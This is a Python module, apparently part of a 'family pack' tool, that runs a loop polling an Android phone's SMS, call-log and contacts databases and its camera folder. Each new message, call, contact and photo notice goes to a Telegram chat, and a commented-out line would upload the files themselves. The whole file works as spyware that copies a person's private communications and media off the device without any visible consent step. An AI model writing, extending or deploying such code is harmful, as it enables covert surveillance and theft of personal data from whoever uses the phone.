# bsb_family_pack2/auto_monitor.py
import time
import os
import json
import sqlite3
import glob
from datetime import datetime
from .telegram_utils import send_message, send_document

CONFIG_FILE = "bsb_config.json"
LAST_SMS_FILE = "last_sms.txt"
LAST_CALL_FILE = "last_call.txt"
LAST_CONTACT_FILE = "last_contact.txt"

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    else:
        print("Configuration not found. Please connect first using bsb -connect ...")
        return None

def monitor_sms():
    config = load_config()
    if not config:
        return
    tg_token = config["tg_token"]
    tg_chat_id = config["tg_chat_id"]
    # Placeholder path for SMS database (Android specific – requires proper permissions)
    sms_db_path = "/data/data/com.android.providers.telephony/databases/mmssms.db"
    if not os.path.exists(sms_db_path):
        return
    try:
        conn = sqlite3.connect(sms_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT address, date, body FROM sms ORDER BY date DESC LIMIT 1")
        row = cursor.fetchone()
        conn.close()
        if row:
            sms_str = (f"From: {row[0]}\n"
                       f"Time: {datetime.fromtimestamp(int(row[1]) / 1000).strftime('%Y-%m-%d %H:%M:%S')}\n"
                       f"Message: {row[2]}")
            if os.path.exists(LAST_SMS_FILE):
                with open(LAST_SMS_FILE, "r") as f:
                    last_sms = f.read()
                if sms_str != last_sms:
                    send_message(tg_token, tg_chat_id, "📩 New SMS:\n" + sms_str)
                    with open(LAST_SMS_FILE, "w") as f:
                        f.write(sms_str)
            else:
                with open(LAST_SMS_FILE, "w") as f:
                    f.write(sms_str)
                send_message(tg_token, tg_chat_id, "📩 New SMS:\n" + sms_str)
    except Exception as e:
        print(f"Error monitoring SMS: {e}")

def monitor_calls():
    config = load_config()
    if not config:
        return
    tg_token = config["tg_token"]
    tg_chat_id = config["tg_chat_id"]
    # Placeholder path for call log database
    call_db_path = "/data/data/com.android.providers.contacts/databases/calllog.db"
    if not os.path.exists(call_db_path):
        return
    try:
        conn = sqlite3.connect(call_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT number, date, duration, type FROM calls ORDER BY date DESC LIMIT 1")
        row = cursor.fetchone()
        conn.close()
        if row:
            call_type = "Incoming" if row[3] == 1 else "Outgoing"
            call_str = (f"Number: {row[0]}\n"
                        f"Time: {datetime.fromtimestamp(int(row[1]) / 1000).strftime('%Y-%m-%d %H:%M:%S')}\n"
                        f"Duration: {row[2]}s\n"
                        f"Type: {call_type}")
            if os.path.exists(LAST_CALL_FILE):
                with open(LAST_CALL_FILE, "r") as f:
                    last_call = f.read()
                if call_str != last_call:
                    send_message(tg_token, tg_chat_id, "📞 New Call Log:\n" + call_str)
                    with open(LAST_CALL_FILE, "w") as f:
                        f.write(call_str)
            else:
                with open(LAST_CALL_FILE, "w") as f:
                    f.write(call_str)
                send_message(tg_token, tg_chat_id, "📞 New Call Log:\n" + call_str)
    except Exception as e:
        print(f"Error monitoring Calls: {e}")

def monitor_contacts():
    config = load_config()
    if not config:
        return
    tg_token = config["tg_token"]
    tg_chat_id = config["tg_chat_id"]
    # Placeholder path for contacts database
    contacts_db_path = "/data/data/com.android.providers.contacts/databases/contacts2.db"
    if not os.path.exists(contacts_db_path):
        return
    try:
        conn = sqlite3.connect(contacts_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT display_name, number FROM view_data ORDER BY display_name ASC LIMIT 1")
        row = cursor.fetchone()
        conn.close()
        if row:
            contact_str = f"Name: {row[0]}\nPhone: {row[1]}"
            if os.path.exists(LAST_CONTACT_FILE):
                with open(LAST_CONTACT_FILE, "r") as f:
                    last_contact = f.read()
                if contact_str != last_contact:
                    send_message(tg_token, tg_chat_id, "📇 New Contact Added:\n" + contact_str)
                    with open(LAST_CONTACT_FILE, "w") as f:
                        f.write(contact_str)
            else:
                with open(LAST_CONTACT_FILE, "w") as f:
                    f.write(contact_str)
                send_message(tg_token, tg_chat_id, "📇 New Contact Added:\n" + contact_str)
    except Exception as e:
        print(f"Error monitoring Contacts: {e}")

def monitor_files():
    config = load_config()
    if not config:
        return
    tg_token = config["tg_token"]
    tg_chat_id = config["tg_chat_id"]
    # Monitor a specific directory for new photos/videos/files.
    # Adjust the path as needed (this example uses Android's camera directory).
    watch_directory = "/sdcard/DCIM/Camera/"
    try:
        files = glob.glob(watch_directory + "*")
        for file in files:
            if os.path.getctime(file) > time.time() - 60:  # files created in the last 60 seconds
                message = f"🖼️ New File Detected:\nFile: {file}"
                send_message(tg_token, tg_chat_id, message)
                # Optionally, send the file itself (uncomment the next line):
                # send_document(tg_token, tg_chat_id, file)
    except Exception as e:
        print(f"Error monitoring Files: {e}")

def start_monitoring():
    print("Starting auto monitoring... (Press Ctrl+C to stop)")
    try:
        while True:
            monitor_sms()
            monitor_calls()
            monitor_contacts()
            monitor_files()
            time.sleep(60)  # Check every 60 seconds
    except KeyboardInterrupt:
        print("Monitoring stopped by user.")
